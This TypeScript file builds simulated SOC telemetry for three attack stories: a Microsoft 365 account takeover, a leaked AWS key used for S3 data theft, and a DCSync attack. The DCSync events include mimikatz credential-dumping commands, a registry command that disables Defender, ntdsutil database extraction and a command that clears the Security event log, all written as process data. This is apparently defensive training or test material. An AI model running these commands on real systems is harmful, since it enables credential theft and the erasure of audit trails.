      description: "k.taylor's account signed in to Microsoft 365 from a Nigerian IP; Entra ID Protection rated the sign-in high risk with an unlikely-travel risk detection.",
      raw: {
        "azure.signinlogs.properties.userPrincipalName": user.email,
        "azure.signinlogs.properties.ipAddress": nigIp,
        "azure.signinlogs.properties.appDisplayName": "OfficeHome",
        "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
        "azure.signinlogs.properties.riskLevelDuringSignIn": "high",
        "azure.signinlogs.properties.riskLevelAggregated": "high",
        "azure.signinlogs.properties.riskState": "atRisk",
        "azure.signinlogs.properties.riskDetail": "none",
        "azure.signinlogs.properties.riskEventTypes_v2": ["unlikelyTravel", "unfamiliarFeatures"],
        "azure.signinlogs.properties.sessionId": sessionId,
        "azure.signinlogs.properties.status.errorCode": 0,
        "azure.signinlogs.properties.userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "logged-in",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },

    // ── Step 4: Attacker creates email forwarding rule — data exfil prep ───────
    {
      id: "evt_imp_04_inboxrule", ts: T(9 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "account_modify", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      mitre_technique: "T1114.003",
      description: "An inbox rule forwarding all of k.taylor's incoming mail to collector.k.taylor@protonmail.com was created from the Nigerian IP.",
      raw: {
        "data.office365.Operation":        "New-InboxRule",
        "data.office365.Workload":         "Exchange",
        "data.office365.RecordType":       "2",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ResultStatus":     "Success",
        "data.office365.Parameters.Name":  "ForwardTo",
        "data.office365.Parameters.Value": "collector.k.taylor@protonmail.com",
        "data.office365.RuleCondition":    "All messages",
        "data.office365.RuleName":         "Microsoft Outlook",
        "data.office365.UserType":         "0",
        "data.office365.SessionId":        sessionId,
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
      },
    },

    // ── Step 4b: the VPN tunnel is used — internal traffic from the tunnel IP ───
    {
      id: "evt_imp_04b_vpn_traffic", ts: T(11 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      user_email: user.email,
      src_ip: "10.100.50.77", dst_ip: "10.20.8.40", dst_port: 445, protocol: "tcp",
      severity: "medium", mitre_technique: "T1021.002",
      network: { bytes_out: 61440, bytes_in: 2_411_724 },
      description: "The VPN tunnel address 10.100.50.77 opened an SMB session to the engineering file server FS-ENG-01 (10.20.8.40).",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": "10.100.50.77", "source.port": "50122",
        "destination.ip": "10.20.8.40", "destination.port": "445",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ms-ds-smbv3",
        "pan.app": "ms-ds-smbv3", "pan.action": "allow", "pan.rule": "VPN-to-Internal",
        "network.bytes_out": "61440", "network.bytes_in": "2411724",
        "action_result": "allow",
      },
    },

    // ── Step 5: Attacker downloads SharePoint files — data collection ──────────
    {
      id: "evt_imp_05_sharepoint", ts: T(14 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "sharepoint_access", severity: "high",
      user_email: user.email,
      src_ip: nigIp,
      mitre_technique: "T1213.002",
      description: "847 files (2.3GB) were downloaded from the Engineering SharePoint site in 5 minutes from a Nigerian IP.",
      raw: {
        "data.office365.Operation":        "FileDownloaded",
        "data.office365.Workload":         "SharePoint",
        "data.office365.RecordType":       "6",
        "data.office365.UserId":           user.email,
        "data.office365.ClientIP":         nigIp,
        "data.office365.ResultStatus":     "Success",
        "data.office365.ObjectId":         "https://nexacorp.sharepoint.com/sites/Engineering/Shared Documents",
        "data.office365.SiteUrl":          "https://nexacorp.sharepoint.com/sites/Engineering",
        "data.office365.UserType":         "0",
        "data.office365.SourceFileName":   "PCB-Rev4-Schematics.pdf",
        "data.office365.SessionId":        sessionId,
        "data.office365.UserAgent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        // Per-file FileDownloaded record; the 847-file / 2.3GB burst total is carried
        // in file.count for the burst (a SIEM-side aggregate over the records).
        "file.count":                      "847",
        "GeoLocation.country_name":        "Nigeria",
        "GeoLocation.city_name":           "Lagos",
        "GeoLocation.location.lat":        6.5244,
        "GeoLocation.location.lon":        3.3792,
        "event.action": "bulk-download",
        "event.outcome": "success",
        "source.ip": nigIp,
      },
    },
  ];

  return { title: "Account Compromise — Impossible Travel", events, T, MIN, nigIp };
}

/** Telemetry half of `buildCloudKeyLeakS3ExfilScenario`: the events and the story title, no answer key. */
export function cloudKeyLeakS3ExfilScenarioEvents() {
  // Leaked long-term IAM key in a public repo → recon → IAM backdoor user with
  // its own key → S3 GetObject run → GuardDuty. Converted 2026-10-02 from the
  // retired cryptomining story (no compute abuse, no mining): one goal, data theft.
  const B = new Date("2026-06-08T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const attackerIp   = "203.189.76.14";        // Singapore VPS - every attacker call comes from here
  const ciEgressIp   = "54.210.17.88";         // the CI runner's normal egress (baseline)
  const accountId    = "247316892041";
  const iamUser      = "rocketstack-ci-deploy";
  const iamArn       = `arn:aws:iam::${accountId}:user/${iamUser}`;
  const leakedKey    = "AKIATQ4XW7Z2REXAMPLE";
  const backdoorUser = "svc-lambda-monitoring";
  const backdoorArn  = `arn:aws:iam::${accountId}:user/${backdoorUser}`;
  const backdoorKey  = "AKIAWB5NC8HD4EXAMPLE";
  const s3Bucket     = "rocketstack-prod-customer-data";
  const sampleObject = "exports/customers/2026-05/customers_full.csv.gz";
  const commitSha    = "76c770915494ad31afa9e44701a8f39a4924a4e3";
  // The CI runner uses the AWS CLI; the attacker's calls all carry one scripted-SDK user agent.
  const ciAgent      = "aws-cli/2.15.0 md/awscrt#0.19.19 ua/2.0 os/linux#5.10.210-201.852.amzn2.x86_64 md/arch#x86_64 lang/python#3.11.6 md/pyimpl#CPython cfg/retry-mode#standard md/installer#exe md/distrib#amzn.2 prompt/off command/s3.cp";
  const attackerAgent = "Boto3/1.34.131 md/Botocore#1.34.131 ua/2.0 os/linux#6.5.0-1025-aws md/arch#x86_64 lang/python#3.11.9 md/pyimpl#CPython cfg/retry-mode#legacy Botocore/1.34.131";

  /** The CloudTrail identity block of a call signed with one of the two IAM user keys. */
  const asUser = (user: string, arn: string, key: string) => ({
    "aws.cloudtrail.userIdentity.type": "IAMUser",
    "aws.cloudtrail.userIdentity.userName": user,
    "aws.cloudtrail.userIdentity.arn": arn,
    "aws.cloudtrail.userIdentity.accountId": accountId,
    "aws.cloudtrail.userIdentity.accessKeyId": key,
  });
  const fromAttacker = {
    "aws.cloudtrail.sourceIPAddress": attackerIp,
    "aws.cloudtrail.userAgent": attackerAgent,
    "source.ip": attackerIp,
    "GeoLocation.country_name": "Singapore",
    "GeoLocation.city_name": "Singapore",
    "GeoLocation.location.lat": 1.3521,
    "GeoLocation.location.lon": 103.8198,
  };
  /** One CloudTrail record of a call made from the attacker's server. */
  const call = (id: string, at: number, eventName: string, eventSource: string, as: "leaked" | "backdoor", opts: {
    type?: TelemetryEvent["event_type"]; severity?: TelemetryEvent["severity"]; mitre?: string; tactic?: string; description: string;
    params?: Record<string, unknown>; extra?: Record<string, unknown>; cloud?: TelemetryEvent["cloud"];
  }): TelemetryEvent => ({
    id, ts: T(at),
    source: "cloudtrail", vendor: "AWS CloudTrail", event_type: opts.type ?? "cloud_api_call",
    severity: opts.severity ?? "low", src_ip: attackerIp,
    ...(opts.mitre ? { mitre_technique: opts.mitre } : {}), ...(opts.tactic ? { mitre_tactic: opts.tactic } : {}),
    ...(opts.cloud ? { cloud: opts.cloud } : {}),
    description: opts.description,
    raw: {
      "aws.cloudtrail.eventName": eventName,
      "aws.cloudtrail.eventSource": eventSource,
      "aws.cloudtrail.awsRegion": "us-east-1",
      ...(as === "leaked" ? asUser(iamUser, iamArn, leakedKey) : asUser(backdoorUser, backdoorArn, backdoorKey)),
      ...fromAttacker,
      ...(opts.params ?? {}),
      ...(opts.extra ?? {}),
      "event.outcome": "success",
      "event.action": eventName,
      "cloud.provider": "aws",
      "cloud.region": "us-east-1",
      "cloud.account.id": accountId,
    },
  });
  /** An S3 data event: the backdoor key reads one object. */
  const getObject = (id: string, at: number, key: string, bytes: number, mitre?: string): TelemetryEvent =>
    call(id, at, "GetObject", "s3.amazonaws.com", "backdoor", {
      type: "cloud_storage_access", severity: "critical", mitre, tactic: mitre ? "Collection" : undefined,
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "us-east-1", resource: s3Bucket },
      description: `GetObject read ${key} from ${s3Bucket}, signed with access key ${backdoorKey} (${backdoorUser}) from ${attackerIp}.`,
      params: {
        "aws.cloudtrail.eventCategory": "Data",
        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
        "aws.cloudtrail.requestParameters.key": key,
        "aws.cloudtrail.additionalEventData.bytesTransferredOut": bytes,
      },
    });

  const events: TelemetryEvent[] = [
    // ── Baseline: how this key is normally used (CI runner, artifact upload) ──
    {
      id: "evt_kl_00_baseline_ci", ts: T(-3 * 60 * MIN), is_baseline: true,
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call",
      severity: "informational", src_ip: ciEgressIp,
      description: `${iamUser} (key ${leakedKey}) uploaded a build artifact to rocketstack-deploy-artifacts from the CI runner egress ${ciEgressIp}.`,
      raw: {
        "aws.cloudtrail.eventName": "PutObject",
        "aws.cloudtrail.eventSource": "s3.amazonaws.com",
        "aws.cloudtrail.awsRegion": "us-east-1",
        "aws.cloudtrail.sourceIPAddress": ciEgressIp,
        "aws.cloudtrail.userAgent": ciAgent,
        ...asUser(iamUser, iamArn, leakedKey),
        "aws.cloudtrail.requestParameters.bucketName": "rocketstack-deploy-artifacts",
        "aws.cloudtrail.requestParameters.key": "builds/api/2026-06-08/api-4.18.2.tar.gz",
        "event.outcome": "success",
        "event.action": "PutObject",
        "cloud.provider": "aws",
        "cloud.region": "us-east-1",
        "cloud.account.id": accountId,
        "source.ip": ciEgressIp,
      },
    },

    // ── T-4: the push that publishes the key (GitHub audit log) ──
    {
      id: "evt_kl_00b_git_push", ts: T(-4 * MIN),
      source: "vcs", vendor: "GitHub Audit Log", event_type: "cloud_api_call",
      user_email: "a.levy@rocketstack.io",
      severity: "informational",
      description: "a.levy pushed commit 76c77091 to the public repository rocketstack-io/deploy-scripts, adding scripts/deploy.sh.",
      raw: {
        "github.action": "git.push",
        "github.actor": "a.levy",
        "github.repo": "rocketstack-io/deploy-scripts",
        "github.visibility": "public",
        "github.ref": "refs/heads/main",
        "github.commit_sha": commitSha,
        "github.path": "scripts/deploy.sh",
        "event.outcome": "success",
      },
    },

    // ── T+0: the leak is detected - GitHub secret scanning on a public repo ──
    {
      id: "evt_kl_01_github_alert", ts: T(0),
      source: "vcs", vendor: "GitHub Advanced Security", event_type: "ids_signature",
      severity: "high", mitre_technique: "T1552.001", mitre_tactic: "Credential Access", is_detection: true,
      user_email: "a.levy@rocketstack.io",
      description: `GitHub secret scanning opened alert #42: AWS access key ${leakedKey} in scripts/deploy.sh line 14 of the public repo rocketstack-io/deploy-scripts, pushed by a.levy@rocketstack.io.`,
      raw: {
        "event.provider": "GitHub Advanced Security",
        "event.action": "secret_scanning_alert_created",
        "alert.name": "Secret scanning alert: Amazon AWS Access Key ID",
        "github.secret_scanning.alert_number": "42",
        "github.secret_scanning.secret_type": "aws_access_key_id",
        "github.secret_scanning.secret_type_display_name": "Amazon AWS Access Key ID",
        "github.secret_scanning.secret": leakedKey,
        "github.secret_scanning.validity": "active",
        "github.secret_scanning.repository": "rocketstack-io/deploy-scripts",
        "github.secret_scanning.repository_visibility": "public",
        "github.secret_scanning.commit_sha": commitSha,
        "github.secret_scanning.path": "scripts/deploy.sh",
        "github.secret_scanning.location_url": `https://github.com/rocketstack-io/deploy-scripts/blob/${commitSha}/scripts/deploy.sh`,
        "github.secret_scanning.start_line": "14",
        "github.secret_scanning.pushed_by": "a.levy@rocketstack.io",
        "github.secret_scanning.pushed_at": T(-4 * MIN),
        "github.secret_scanning.push_protection_bypassed": "false",
        "github.secret_scanning.state": "open",
        "github.secret_scanning.publicly_leaked": "true",
      },
    },

    // ── T+2: first use of the key from outside - who am I? ──
    call("evt_kl_02_getcaller", 2 * MIN, "GetCallerIdentity", "sts.amazonaws.com", "leaked", {
      severity: "high", mitre: "T1078.004", tactic: "Initial Access",
      description: `GetCallerIdentity was called with access key ${leakedKey} (${iamUser}) from ${attackerIp} (Singapore).`,
    }),

    // ── T+4: discovery - buckets, users, and what the CI user may do ──
    call("evt_kl_03_list_buckets", 4 * MIN, "ListBuckets", "s3.amazonaws.com", "leaked", {
      severity: "medium", mitre: "T1619", tactic: "Discovery",
      description: `ListBuckets was called with access key ${leakedKey} from ${attackerIp}.`,
    }),
    call("evt_kl_03b_list_users", 4 * MIN + 20 * SEC, "ListUsers", "iam.amazonaws.com", "leaked", {
      severity: "low",
      description: `ListUsers was called with access key ${leakedKey} from ${attackerIp}.`,
    }),
    call("evt_kl_03c_list_policies", 4 * MIN + 41 * SEC, "ListAttachedUserPolicies", "iam.amazonaws.com", "leaked", {
      severity: "low",
      description: `ListAttachedUserPolicies was called for ${iamUser} with access key ${leakedKey} from ${attackerIp}.`,
      params: { "aws.cloudtrail.requestParameters.userName": iamUser },
    }),

    // ── T+10: a new IAM user - persistence independent of the leaked key ──
    call("evt_kl_04_create_user", 10 * MIN, "CreateUser", "iam.amazonaws.com", "leaked", {
      type: "account_create", severity: "critical", mitre: "T1136.003", tactic: "Persistence",
      description: `CreateUser created IAM user ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
      params: {
        "aws.cloudtrail.requestParameters.userName": backdoorUser,
        "aws.cloudtrail.requestParameters.path": "/",
        "aws.cloudtrail.responseElements.user.userName": backdoorUser,
        "aws.cloudtrail.responseElements.user.userId": "AIDATQ4XW7Z2KF9MRS3QE",
        "aws.cloudtrail.responseElements.user.arn": backdoorArn,
        "aws.cloudtrail.responseElements.user.createDate": T(10 * MIN),
      },
    }),

    // ── T+11: a long-term key for the new user (the key the S3 calls use) ──
    call("evt_kl_05_create_key", 11 * MIN, "CreateAccessKey", "iam.amazonaws.com", "leaked", {
      severity: "critical", mitre: "T1098.001", tactic: "Persistence",
      description: `CreateAccessKey issued access key ${backdoorKey} for ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
      params: {
        "aws.cloudtrail.requestParameters.userName": backdoorUser,
        "aws.cloudtrail.responseElements.accessKey.userName": backdoorUser,
        "aws.cloudtrail.responseElements.accessKey.accessKeyId": backdoorKey,
        "aws.cloudtrail.responseElements.accessKey.status": "Active",
        "aws.cloudtrail.responseElements.accessKey.createDate": T(11 * MIN),
      },
    }),

    // ── T+13: full admin on the new user ──
    call("evt_kl_06_attach_admin", 13 * MIN, "AttachUserPolicy", "iam.amazonaws.com", "leaked", {
      type: "cloud_role_change", severity: "critical", mitre: "T1098.003", tactic: "Persistence",
      description: `AttachUserPolicy attached the AWS managed policy AdministratorAccess to ${backdoorUser}, called with access key ${leakedKey} from ${attackerIp}.`,
      params: {
        "aws.cloudtrail.requestParameters.userName": backdoorUser,
        "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
      },
    }),

    // ── T+14: the new key's first use ──
    call("evt_kl_06b_backdoor_caller", 14 * MIN, "GetCallerIdentity", "sts.amazonaws.com", "backdoor", {
      severity: "medium",
      description: `GetCallerIdentity was called with access key ${backdoorKey} (${backdoorUser}) from ${attackerIp}.`,
    }),

    // ── T+16: GuardDuty on the IAM changes made with the CI key from a new IP ──
    {
      id: "evt_kl_07_gd_persistence", ts: T(16 * MIN),
      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call",
      severity: "high", mitre_technique: "T1098.001", mitre_tactic: "Persistence", is_detection: true,
      src_ip: attackerIp,
      description: `GuardDuty raised Persistence:IAMUser/AnomalousBehavior (severity 8.0) for ${iamUser}, key ${leakedKey}: CreateAccessKey from ${attackerIp}.`,
      raw: {
        "aws.guardduty.type": "Persistence:IAMUser/AnomalousBehavior",
        "aws.guardduty.severity": "8.0",
        "aws.guardduty.title": "User rocketstack-ci-deploy is anomalously invoking APIs commonly used in Persistence tactics.",
        "aws.guardduty.description": "APIs commonly used in Persistence tactics were invoked by user IAMUser : rocketstack-ci-deploy under unusual circumstances. Such activity is not typically seen from this user.",
        "aws.guardduty.resource.accessKeyDetails.accessKeyId": leakedKey,
        "aws.guardduty.resource.accessKeyDetails.userName": iamUser,
        "aws.guardduty.service.action.awsApiCallAction.api": "CreateAccessKey",
        "aws.guardduty.service.eventFirstSeen": T(10 * MIN),
        "aws.guardduty.service.eventLastSeen": T(13 * MIN),
        "aws.guardduty.service.count": 3,
        "aws.cloudtrail.awsRegion": "us-east-1",
        "aws.cloudtrail.userIdentity.userName": iamUser,
        "cloud.account.id": accountId,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.city_name": "Singapore",
      },
    },

    // ── T+17: the attacker looks for the data it will read ──
    call("evt_kl_07b_list_objects", 17 * MIN + 10 * SEC, "ListObjectsV2", "s3.amazonaws.com", "backdoor", {
      severity: "medium", mitre: "T1619", tactic: "Discovery",
      description: `ListObjectsV2 listed exports/ in ${s3Bucket} with access key ${backdoorKey} from ${attackerIp}.`,
      params: {
        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
        "aws.cloudtrail.requestParameters.prefix": "exports/",
      },
    }),

    // ── T+18: the new key reads the customer-data bucket (S3 data events, a sample of the run) ──
    getObject("evt_kl_08_s3_getobject", 18 * MIN, sampleObject, 412_388_190, "T1530"),
    getObject("evt_kl_08b_getobject", 18 * MIN + 40 * SEC, "exports/billing/2026-05/invoices.csv.gz", 96_204_811),
    getObject("evt_kl_08c_getobject", 21 * MIN + 15 * SEC, "pii/kyc/2026-05/batch-0412.parquet", 58_771_034),
    getObject("evt_kl_08d_getobject", 24 * MIN + 2 * SEC, "exports/customers/2026-04/customers_full.csv.gz", 398_112_507),
    getObject("evt_kl_08e_getobject", 27 * MIN + 30 * SEC, "pii/kyc/2026-05/batch-0413.parquet", 61_330_922),

    // ── T+31: GuardDuty S3 Protection on the read volume ──
    {
      id: "evt_kl_09_gd_s3_exfil", ts: T(31 * MIN),
      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call",
      severity: "critical", mitre_technique: "T1530", mitre_tactic: "Collection", is_detection: true,
      src_ip: attackerIp,
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "us-east-1", resource: s3Bucket },
      description: `GuardDuty raised Exfiltration:S3/AnomalousBehavior (severity 8.0) on ${s3Bucket}: 1,284 GetObject calls by ${backdoorUser}, key ${backdoorKey}, from ${attackerIp}.`,
      raw: {
        "aws.guardduty.type": "Exfiltration:S3/AnomalousBehavior",
        "aws.guardduty.severity": "8.0",
        "aws.guardduty.title": "An IAM entity invoked an S3 API in a suspicious way.",
        "aws.guardduty.description": "An IAM entity invoked an S3 API in a suspicious way. Such activity is not typically seen from this entity.",
        "aws.guardduty.resource.accessKeyDetails.accessKeyId": backdoorKey,
        "aws.guardduty.resource.accessKeyDetails.userName": backdoorUser,
        "aws.guardduty.resource.s3BucketDetails.name": s3Bucket,
        "aws.guardduty.service.action.awsApiCallAction.api": "GetObject",
        "aws.guardduty.service.eventFirstSeen": T(18 * MIN),
        "aws.guardduty.service.eventLastSeen": T(29 * MIN),
        "aws.guardduty.service.count": 1284,
        "aws.cloudtrail.awsRegion": "us-east-1",
        "aws.cloudtrail.requestParameters.bucketName": s3Bucket,
        "aws.cloudtrail.userIdentity.userName": backdoorUser,
        "cloud.account.id": accountId,
        "GeoLocation.country_name": "Singapore",
        "GeoLocation.city_name": "Singapore",
      },
    },
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return {
    title: "Secret scanning alert on a public deploy repo", events, T, MIN,
    attackerIp, accountId, iamUser, leakedKey, backdoorUser, backdoorKey, s3Bucket, sampleObject, commitSha,
  };
}

/** Telemetry half of `buildDCSyncScenario`: the events and the story title, no answer key. */
export function dcSyncScenarioEvents() {
  const B = new Date("2026-06-03T22:15:00Z").getTime();   // 01:15 Israeli time (night attack)
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // Story-specific VPS (185.220.101.47 is the k8s-pod-escape / Tor-exit IP elsewhere).
  const attackerIp   = "176.97.210.93";
  const dc01         = "SRV-NEXACORP-DC01";
  const dc02         = "SRV-NEXACORP-DC02";
  const dc01Ip       = "10.0.1.10";
  const adminEmail   = "it.admin@nexacorp.com";
  const jumpIp       = "10.0.1.55";                 // the admin's own workstation: where it.admin normally connects from
  const mimikatzHash = makeSha256("mimikatz_win32_a_2026");
  const ntdsDitHash        = makeSha256("ntdsutil_ntds_snapshot");
  // ntdsutil.exe is a signed Microsoft binary; it cannot share a hash with
  // the 2.7 GB AD database extract it produces.
  const ntdsutilBinaryHash = makeSha256("ntdsutil_exe_system_binary");
  const systemHiveHash     = makeSha256("ifm_registry_system_hive");
  const SID = "S-1-5-21-2847391045-1923847562-3041928374";
  const adminSid = `${SID}-1115`;
  const wdPath = "C:\\Users\\it.admin\\AppData\\Roaming\\wdhelper.exe";
  const ifmDir = "C:\\Windows\\Temp\\ifm";
  const ditPath = `${ifmDir}\\Active Directory\\ntds.dit`;
  const shadowAdmin = "svc-monitoring-prod";

  // ── processes of the RDP session on DC01 ────────────────────────────────────
  type P = NonNullable<TelemetryEvent["process"]>;
  const user = "NEXACORP\\it.admin";
  const mk = (name: string, pid: number, path: string, parent: string, ppid: number, cmdline: string, extra: Partial<P> = {}): P =>
    ({ name, pid, path, parent_name: parent, parent_pid: ppid, cmdline, user, integrity: "high", ...extra });
  const userinit = mk("userinit.exe", 3188, "C:\\Windows\\System32\\userinit.exe", "winlogon.exe", 1048, "C:\\Windows\\system32\\userinit.exe");
  const explorer = mk("explorer.exe", 3340, "C:\\Windows\\explorer.exe", "userinit.exe", 3188, "C:\\Windows\\Explorer.EXE");
  const cmd = mk("cmd.exe", 5044, "C:\\Windows\\System32\\cmd.exe", "explorer.exe", 3340, "\"C:\\Windows\\System32\\cmd.exe\"");
  const wd1 = mk("wdhelper.exe", 4872, wdPath, "cmd.exe", 5044, "wdhelper.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", { hash: { sha256: mimikatzHash } });
  const wd2 = mk("wdhelper.exe", 5230, wdPath, "cmd.exe", 5044, "wdhelper.exe \"privilege::debug\" \"lsadump::dcsync /domain:nexacorp.com /user:krbtgt\" exit", { hash: { sha256: mimikatzHash } });
  const regExe = mk("reg.exe", 5316, "C:\\Windows\\System32\\reg.exe", "cmd.exe", 5044,
    "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f");
  // An interactive RDP session runs at High integrity even for a Domain Admin - SYSTEM would need a
  // service install or token theft, which this chain never shows. ntdsutil only needs SeBackupPrivilege.
  const ntdsutil = mk("ntdsutil.exe", 6028, "C:\\Windows\\System32\\ntdsutil.exe", "cmd.exe", 5044,
    `ntdsutil "ac i ntds" "ifm" "create full ${ifmDir}" q q`, { hash: { sha256: ntdsutilBinaryHash } });
  const wevtutil = mk("wevtutil.exe", 6144, "C:\\Windows\\System32\\wevtutil.exe", "cmd.exe", 5044, "wevtutil cl Security");

  // ── helpers ──────────────────────────────────────────────────────────────────
  const mde = (id: string, at: number, type: TelemetryEvent["event_type"], p: P, description: string, action: string, over: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(at),
    source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: type,
    hostname: dc01, user_email: adminEmail, src_ip: dc01Ip,
    severity: "informational",
    process: p, description,
    raw: { "event.provider": "Microsoft Defender ATP", "DeviceName": dc01, "ActionType": action },
    ...over,
  });
  const proc = (id: string, at: number, p: P, description: string, over: Partial<TelemetryEvent> = {}) => mde(id, at, "process_create", p, description, "ProcessCreated", over);
  const winHead = (host: string, id: string, rec: number) => ({
    "winlog.event_id": id, "winlog.channel": "Security", "winlog.computer_name": host,
    "winlog.provider_name": "Microsoft-Windows-Security-Auditing", "winlog.record_id": String(rec), "event.code": id,
  });

  const events: TelemetryEvent[] = [
    // ── Baseline: how it.admin normally reaches DC01 - Kerberos from the admin workstation, yesterday morning ──
    {
      id: "evt_dc_baseline_tgt", ts: "2026-06-02T09:14:22.000Z", is_baseline: true,
      source: "ad", vendor: "Windows Security", event_type: "kerberos_tgt",
      hostname: dc01, user_email: adminEmail, src_ip: jumpIp,
      severity: "informational",
      description: "it.admin received a Kerberos TGT from DC01 for a session started at the admin workstation 10.0.1.55.",
      raw: {
        ...winHead(dc01, "4768", 1962204),
        "winlog.event_data.TargetUserName": "it.admin", "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetSid": adminSid,
        "winlog.event_data.TicketEncryptionType": "0x12", "winlog.event_data.PreAuthType": "2", "winlog.event_data.Status": "0x0",
        "winlog.event_data.IpAddress": jumpIp,
      },
    },
    {
      id: "evt_dc_baseline_rdp", ts: "2026-06-02T09:14:40.000Z", is_baseline: true,
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc01, user_email: adminEmail, src_ip: jumpIp,
      severity: "informational",
      description: "it.admin logged on to DC01 over remote desktop from the admin workstation 10.0.1.55, using Kerberos.",
      raw: {
        ...winHead(dc01, "4624", 1962219),
        "winlog.event_data.TargetUserSid": adminSid,
        "winlog.event_data.TargetUserName": "it.admin", "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.LogonType": "10", "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Negotiate", "winlog.event_data.WorkstationName": "ITADMIN-WS01",
        "winlog.event_data.IpAddress": jumpIp,
      },
    },

    // ── EVENT 1 - RDP logon from the Netherlands VPS ────────────────────────
    {
      id: "evt_dc_00_ntlm_validate", ts: T(-1 * SEC),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc01, user_email: adminEmail,
      severity: "low",
      description: "DC01 validated an NTLM credential for it.admin sent from workstation DESKTOP-9KQ2MPA.",
      raw: {
        ...winHead(dc01, "4776", 2097838),
        "winlog.event_data.PackageName": "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0",
        "winlog.event_data.TargetUserName": "it.admin",
        "winlog.event_data.Workstation": "DESKTOP-9KQ2MPA",
        "winlog.event_data.Status": "0x0",
      },
    },
    {
      id: "evt_dc_01_rdp", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: dc01, user_email: adminEmail, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1021.001",
      description: `The it.admin account logged on to ${dc01} with a RemoteInteractive (RDP) logon from ${attackerIp} in Amsterdam, Netherlands, at 01:15 local time.`,
      raw: {
        ...winHead(dc01, "4624", 2097841),
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": dc01 + "$",
        "winlog.event_data.SubjectDomainName": "NEXACORP",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        "winlog.event_data.TargetUserSid": adminSid,
        "winlog.event_data.TargetUserName": "it.admin",
        "winlog.event_data.TargetDomainName": "NEXACORP",
        "winlog.event_data.TargetLogonId": "0xC3F4A1",
        "winlog.event_data.LogonType": "10",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "NTLM",
        "winlog.event_data.LmPackageName": "NTLM V2",
        "winlog.event_data.WorkstationName": "DESKTOP-9KQ2MPA",
        "winlog.event_data.IpAddress": attackerIp,
        "winlog.event_data.IpPort": "51847",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1842",
        "event.action": "logged-in",
        "event.outcome": "success",
        "user.name": "NEXACORP\\it.admin",
        "user.domain": "NEXACORP",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "source.geo.location.lat": 52.3702,
        "source.geo.location.lon": 4.8952,
        "host.name": dc01,
        "logon.type": "10",
        "authentication.protocol": "NTLM",
        "authentication.status": "success",
      },
    },
    {
      // The sign-in geography Sentinel UEBA holds for the account: the first connection from this country.
      id: "evt_dc_01b_ueba_country", ts: T(20 * SEC),
      source: "ueba", vendor: "Microsoft Sentinel UEBA", event_type: "ueba_anomaly",
      hostname: dc01, user_email: adminEmail, src_ip: attackerIp,
      severity: "medium", is_detection: true,
      description: "Microsoft Sentinel UEBA recorded the first remote desktop logon for it.admin from the Netherlands; the account's usual country is Israel.",
      raw: {
        "event.action": "BehaviorAnomalyDetected",
        "event.outcome": "alerted",
        "user.name": "it.admin",
        "behavior.name": "unusual_logon_country",
        "behavior.score": "7.1",
        "CountryUncommonlyConnectedFrom": "true",
        "ActionUncommonlyPerformedByUser": "true",
        "anomaly.reason": "First connection from Netherlands in 30 days; usual country: Israel",
        "source.ip": attackerIp,
